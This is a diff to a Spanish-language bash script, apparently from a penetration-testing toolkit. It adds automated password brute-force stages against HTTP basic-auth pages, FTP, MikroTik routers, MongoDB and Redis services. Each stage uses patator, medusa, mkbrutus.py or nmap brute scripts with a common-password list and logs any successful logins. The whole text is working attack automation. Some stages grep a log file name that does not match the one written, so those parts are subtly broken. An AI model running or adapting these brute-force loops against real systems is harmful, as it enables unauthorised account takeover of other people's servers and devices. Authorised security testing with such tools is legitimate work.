@@ -151,6 +151,28 @@ then
 	 fi	
 fi
 
+if [ -f .servicios/web401.txt ]
+then
+
+	echo -e "\n\t $OKBLUE Encontre web 401 activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+		then       	 
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing pass web ######################$RESET"	
+		for ip in $(cat .servicios/web401.txt); do
+			echo -e "\n\t########### $ip #######"			
+			patator http_fuzz method=GET url="http://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 2>> logs/cracking/$ip-80-adminPassword.txt
+			grep --color=never '200 OK' logs/cracking/$ip-80-adminPassword.txt | tee -a  vulnerabilidades/$ip-80-adminPassword.txt
+			patator http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 2>> logs/cracking/$ip-80-rootPassword.txt
+			grep --color=never '200 OK' logs/cracking/$ip-80-rootPassword.txt | tee -a  vulnerabilidades/$ip-80-rootPassword.txt
+			echo ""			
+		done
+		insert_data
+	 fi	
+fi
+
 if [ -f .servicios/Windows.txt ]
 then
 	echo -e "\n\t $OKBLUE Encontre servicios SMB activos (Windows). Realizar ataque de passwords ? s/n $RESET"	  
@@ -198,6 +220,30 @@ then
 			echo -e "\n\t########### $ip #######"			
 			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt > logs/cracking/$ip-80-password.txt
 			grep --color=never 'encontrado' logs/cracking/$ip-80-password.txt | tee -a vulnerabilidades/$ip-80-password.txt										
+			echo ""			
+		done
+		insert_data
+	 fi	
+fi
+
+if [ -f .servicios/ftp.txt ]
+then
+
+	echo -e "\n\t $OKBLUE Encontre servicios de FTP activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+		then       	 
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing pass FTP ######################$RESET"	
+		for line in $(cat .servicios/ftp.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+			echo -e "\n\t########### $ip #######"			
+			
+			medusa -e n -u admin -P top.txt -h $ip -M ftp | tee -a  logs/cracking/$ip-ftp.txt
+			medusa -e n -u root -P top.txt -h $ip -M ftp | tee -a  logs/cracking/$ip-ftp.txt
+			grep --color=never SUCCESS logs/cracking/$ip-ftp.txt > vulnerabilidades/$ip-ftp-password.txt
 			echo ""			
 		done
 		insert_data
@@ -268,8 +314,9 @@ then
 	  for ip in $(cat .servicios/MikroTik.txt); do		
 		echo -e "\n\t########### $ip #######"			
 				
-		mkbrutus.py -t $ip -u admin -d top.txt | tee -a  logs/cracking/$ip-MikroTik.txt
-		mkbrutus.py -t $ip -u $entidad -d top.txt | tee -a  logs/cracking/$ip-MikroTik.txt
+		mkbrutus.py -t $ip -u admin --dictionary top.txt | tee -a  logs/cracking/$ip-MikroTik-password.txt
+		mkbrutus.py -t $ip -u $entidad --dictionary top.txt | tee -a  logs/cracking/$ip-MikroTik-password.txt
+		grep --color=never successful logs/cracking/$ip-MikroTik-password.txt > vulnerabilidades/$ip-MikroTik-password.txt
 		
 		echo ""			
 	 done
@@ -382,9 +429,52 @@ then
 fi
 
 
+if [ -f .servicios/mongoDB.txt ]
+then
+	echo -e "\n\t $OKBLUE Encontre servicios de mongoDB activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+    then      	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
+	  for line in $(cat .servicios/mongoDB.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"			
+		nmap -n -sV -p $port --script=mongodb-brute $ip  > logs/cracking/$ip-monogodb-password.txt 2>/dev/null 
+		grep "|" logs/cracking/$ip-monogodb.txt > vulnerabilidades/$ip-monogodb-password.txt 
+		echo ""			
+	 done
+	 insert_data
+	fi # if bruteforce
+fi
+
+if [ -f .servicios/redis.txt ]
+then
+	echo -e "\n\t $OKBLUE Encontre servicios de redis activos. Realizar ataque de passwords ? s/n $RESET"	  
+	read bruteforce	  
+	  
+	if [ $bruteforce == 's' ]
+    then      	  
+	  echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
+	  for line in $(cat .servicios/redis.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		echo -e "\n\t########### $ip #######"			
+		nmap -n -sV -p $port --script=redis-brute $ip  > logs/cracking/$ip-redis-password.txt 2>/dev/null 
+		grep "|" logs/cracking/$ip-redis.txt > vulnerabilidades/$ip-redis-password.txt 
+		echo ""			
+	 done
+	 insert_data
+	fi # if bruteforce
+fi
+
+
+
 echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
 grep -ira "timed out" * logs/cracking/*
 grep -ira "Can't connect" * logs/cracking/*
+
 
 
 
